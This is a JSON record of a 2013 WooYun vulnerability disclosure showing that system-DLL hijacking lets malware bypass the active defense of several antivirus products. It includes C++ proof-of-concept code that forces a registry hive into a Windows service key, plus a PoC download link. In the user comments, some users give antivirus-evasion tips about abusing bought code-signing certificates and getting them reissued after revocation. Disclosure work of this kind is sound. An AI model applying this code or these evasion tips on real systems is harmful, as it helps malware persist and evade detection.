{"id": 7220, "wybug_id": "wooyun-2013-038250", "wybug_title": "一种绕过绝大多数杀毒软件的方法(卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32)", "wybug_corp": "Cert", "wybug_author": "n0bele", "wybug_date": "2013-09-26 14:29", "wybug_open_date": "2013-12-25 14:30", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向公众公开  简要描述： 受影响厂商:包括但不仅限于卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32 详细说明：  杀毒软件在主动防御的时候过于依赖WFP，漏防了系统自身的文件，导致了恶意程序可能通过感染系统dll染过主动防御执行任意操作.DllHijack POC代码:\nBOOL EnableDebugPriv(LPCTSTR lpName){\tBOOL bRet = FALSE;\tHANDLE hToken = NULL;\tTOKEN_PRIVILEGES tp;\tLUID luid;\tdo\t{\t\tif(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))\t\t\tbreak;\t\tif(!LookupPrivilegeValue(NULL,lpName,&luid))\t\t\tbreak;\t\ttp.PrivilegeCount = 1;\t\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\ttp.Privileges[0].Luid = luid;\t\tbRet = AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);\t}\twhile(FALSE);\t\tif(hToken != NULL)\t\tCloseHandle(hToken);\treturn bRet;}BOOL RestoreReg(HKEY hKey,LPCWSTR lpSubKey,TCHAR szFilePath[MAX_PATH]){\tBOOL bRet = FALSE;\tHKEY hCur = NULL;\tdo\t{\t\tif(!EnableDebugPriv(SE_RESTORE_NAME))\t\t\tbreak;\t\tif(RegOpenKeyEx(hKey,lpSubKey,NULL,KEY_ALL_ACCESS,&hCur) != ERROR_SUCCESS &&\t\t\tRegCreateKey(hKey,lpSubKey,&hCur) != ERROR_SUCCESS)\t\t\tbreak;\t\tif(RegRestoreKey(hCur,szFilePath,REG_FORCE_RESTORE) != ERROR_SUCCESS)\t\t\tbRet = TRUE;\t}\twhile(FALSE);\tif(hCur)\t\tRegCloseKey(hCur);\treturn bRet;}BOOL CDllHijackApp::InitInstance(){\tCWinApp::InitInstance();\tRestoreReg(HKEY_LOCAL_MACHINE,L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\poc\",L\"C:\\\\poc.hiv\");\treturn TRUE;}\n   漏洞证明：  poc下载地址http://pan.baidu.com/s/1uuF8Z   修复方案：  辅助WFP防护，校验文件   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-10-02 00:27 厂商回复： CNVD确认并在多个软件实例上复现所述情况，对于绕过查杀思路原理上进行认定。后续评估情况待补充，国庆后将更新后续跟进分析及评估。rank 15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-26 14:56 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  你这一提交，有多少玩免杀的没饭吃了。。    \n     2013-09-26 15:00 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  avast呢    \n     2013-09-26 15:03 |    \t\tn0bele \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:45        | 无耻最寂寞)\t\t \n  @鬼魅羊羔 你以为防病毒厂商想把所有病毒杀完？杀完了装杀毒软件干嘛。不让一般绕过方法失效，0day又怎么卖钱？    \n     2013-09-26 15:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @n0bele 有道理    \n     2013-09-26 16:01 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  关注下。    \n     2013-09-26 16:48 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  洞主卖过这方法没……    \n     2013-09-26 17:16 |    \t\t夜 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小夜，一个苦逼程序员)\t\t \n  标题太吓人了    \n     2013-09-26 20:18 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  包括但不仅限于    \n     2013-09-26 21:40 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  有点夸张...不管怎么绕过都是有生存周期的,你利用的东西,再怎么厉害,总要去给目标中,有中就会有被捕获样本,只要样本被捕获就会被杀..要是说绕过..那方法多了去了,呵呵...    \n     2013-09-26 22:07 |    \t\tn0bele \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:45        | 无耻最寂寞)\t\t \n  @liner 方法是很多的，在乌云大概提到8种，剩下的你来补充吧。目标是非0day不能提权    \n     2013-10-05 19:01 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  数字签名信任？    \n     2013-10-05 20:26 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  @毕月乌 数字签名？白加黑？    \n     2013-10-05 20:28 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  目测楼主有0day，真心膜拜楼主    \n     2013-10-07 03:22 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @萧然 正规数字签名，直接从CA买或者其他手段~反正我就有正规的数字签名，所有杀软都不杀~    \n     2013-10-09 17:58 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  @毕月乌 正规数字签名，被杀软截获样本后是不是会被吊销？    \n     2013-10-09 22:40 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @萧然 是的~必然吊销，但是你可以以私钥丢失为由申请发新的    \n     2013-10-09 22:42 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @萧然 不过绝大多数杀软默认直接放行，连云都不传，除非人为提交    \n     2013-10-10 03:21 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  @毕月pm你了，基友留个联系方式，好好探讨下    \n     2013-11-12 15:33 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  过不了360，360早就限制对系统文件夹的写入了    \n     2013-12-25 15:23 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  霸气！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}